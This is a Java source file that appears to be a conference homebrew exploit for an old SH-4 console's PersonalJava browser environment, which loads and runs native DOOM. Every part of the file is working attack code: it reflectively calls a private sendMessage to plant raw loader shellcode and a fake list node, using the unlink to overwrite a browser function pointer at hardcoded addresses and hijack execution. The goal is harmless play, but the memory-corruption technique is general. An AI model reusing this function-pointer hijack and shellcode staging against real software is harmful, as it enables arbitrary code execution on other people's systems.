package org.junkyard;

import com.planetweb.eden.client.Eden;
import com.planetweb.eden.client.system.SystemInterface;
import com.planetweb.eden.client.service.Service;
import com.planetweb.eden.client.service.ServiceInfo;
import java.lang.reflect.Method;
import java.io.InputStream;
import java.io.ByteArrayOutputStream;
import java.net.URL;

/**
 * CHAIN "nativedoom": load + run FULL native SH-4 DOOM in the console's RAM.
 *  1. Java downloads doom.bin + WAD into a byte[] (kept alive) = transport.
 *  2. sendMessage(100,setRawDeviceID) plants loader.bin @0x8C29AE00 + a fake IM
 *     list-node whose unlink overwrites sub_8C063F38's saved return address.
 *  3. IM teardown -> unlink -> rts into loader -> loader scans RAM for the byte[]
 *     by doom.bin's header sig, relocates doom->0x8CC00000 + WAD, patches g_wad,
 *     jmp 0x8CC00000 -> native DOOM renders to the framebuffer 0xA5600000.
 * No-ASLR makes every address deterministic. Class v45.3 / PersonalJava 1.1.
 */
public class NativeDoomLoader extends Service {
    static final int DST           = 0x8C29ABE6;          // setRawDeviceID memcpy dest
    static final int LOADER_ADDR   = 0x8C29AE00;          // = DST + 0x21A
    static final int G_NODE        = 0x8C29AC2C;          // IM node global (DST+0x46)
    static final int G_ARR         = 0x8C29AC30;          // IM node ARRAY[0] (DST+0x4A) - sub_8C034920 reads gadget arg0 from here
    static final int FAKE          = 0x8C29ACE6;          // fake node (DST+0x100)
    // CONFIRMED-LIVE auto-fire: page teardown sub_8C034920 -> gadget sub_8C063F38(fakeNode)
    // -> arbitrary write *( *(fakeNode+0x40)+0x3C ) = *(fakeNode+0x3C). We aim the write at
    // the hot fn-ptr 0x8C378B84 (64 call sites): write target = FNPTR, so set prev=FNPTR-0x3C.
    static final int FNPTR         = 0x8C378B84;           // hot browser fn-ptr (validated overwrite)
    static final String DOOM_URL = Junk.BASE + "/doom.bin";
    static final String WAD_URL  = Junk.BASE + "/doom.wad";
    static byte[] g_keepalive;   // keep the transport byte[] in the heap for the loader scan

    static final byte[] LOADER = {44,-47,84,-109,84,-105,44,-46,4,-96,16,96,16,66,76,-115,4,113,16,96,6,-120,-7,-117,17,-124,12,96,48,48,-11,-117,18,-124,7,-120,-14,-117,19,-124,12,96,112,48,-18,-117,20,-124,7,-120,-21,-117,21,-124,-47,-120,-24,-117,22,-124,8,32,-27,-117,23,-124,-30,-120,-29,-113,16,66,-122,47,19,98,-64,114,19,99,47,84,46,88,72,36,-116,51,51,103,51,98,13,-115,76,55,22,-43,56,55,56,53,9,0,35,102,1,114,35,96,-16,112,15,-124,92,54,16,71,-9,-113,0,38,-120,40,13,-119,16,-41,51,98,24,50,24,55,9,0,19,99,1,113,19,96,-16,112,15,-124,124,51,16,66,-9,-113,0,35,10,-47,7,-46,-4,113,33,17,66,33,6,-47,43,65,-10,104,11,0,9,0,-33,0,-48,0,9,0,0,0,66,-116,0,-128,47,0,0,0,1,-116,0,0,-64,-116,68,110,-59,-116};

    public ServiceInfo getInfo() {
        return new ServiceInfo("JunkyardNativeDoom", "1.0", "DistrictCon", Junk.BASE);
    }
    static void p32(byte[] b,int o,int v){ b[o]=(byte)v;b[o+1]=(byte)(v>>8);b[o+2]=(byte)(v>>16);b[o+3]=(byte)(v>>24); }
    // content-length of a URL (so we can pre-size; PersonalJava VM heap ~11MB holds 4.6MB
    // but ByteArrayOutputStream's doubling needs ~2x transient and OOMs -- proven live).
    static int clen(String u) throws Exception {
        java.net.HttpURLConnection c=(java.net.HttpURLConnection)new URL(u).openConnection();
        int n=c.getContentLength(); c.getInputStream().close(); return n;
    }
    // read exactly len bytes of URL u directly into buf[off..] (no intermediate buffer)
    static void readInto(String u, byte[] buf, int off, int len) throws Exception {
        InputStream in=new URL(u).openStream(); int got=0, n;
        while (got<len && (n=in.read(buf,off+got,len-got))>0) got+=n;
        in.close();
        if (got!=len) throw new Exception("short read "+got+"/"+len+" for "+u);
    }
    public void run(){
        Junk.banner("CHAIN nativedoom -- in-memory native SH-4 DOOM");
        Junk.prove();
        try {
            int doomLen=clen(DOOM_URL), wadLen=clen(WAD_URL);
            // ONE 4.6MB allocation, downloaded into directly -> peak heap = the blob only
            byte[] dd=new byte[8+doomLen+wadLen];             // [doomsz][wadsz][doom][wad]
            p32(dd,0,doomLen); p32(dd,4,wadLen);
            readInto(DOOM_URL, dd, 8, doomLen);
            readInto(WAD_URL,  dd, 8+doomLen, wadLen);
            g_keepalive=dd;
            Eden.println("[+] doom="+doomLen+" wad="+wadLen+" staged in one byte["+dd.length+"] (kept alive)");

            int N=0x21A+LOADER.length;
            byte[] p=new byte[N];
            p32(p,G_NODE-DST,FAKE);                            // *0x8C29AC2C = fakeNode (gadget walks list to arg0)
            p32(p,G_ARR-DST,FAKE);                             // *0x8C29AC30[0] = fakeNode (teardown loop's gadget arg0)
            p32(p,(FAKE-DST)+0x3C,LOADER_ADDR);                // fakeNode->next = value written = loader stub
            p32(p,(FAKE-DST)+0x40,FNPTR-0x3C);                 // fakeNode->prev: unlink write lands at FNPTR (0x8C378B84)
            System.arraycopy(LOADER,0,p,LOADER_ADDR-DST,LOADER.length);
            SystemInterface si=Eden.getSystemInterface();
            Method m=SystemInterface.class.getDeclaredMethod("sendMessage",
                new Class[]{ Integer.TYPE, Object.class, Object.class });
            m.setAccessible(true);
            Eden.println("[*] sendMessage(100, payload) -- planting loader + fake node");
            m.invoke(si, new Object[]{ new Integer(100), p, null });
            Eden.println("[+] armed: next page-teardown (sub_8C034920) -> gadget -> FNPTR=loader -> DOOM");
        } catch(Throwable t){ Eden.println("[!] nativedoom: "+t); t.printStackTrace(); }
    }
}
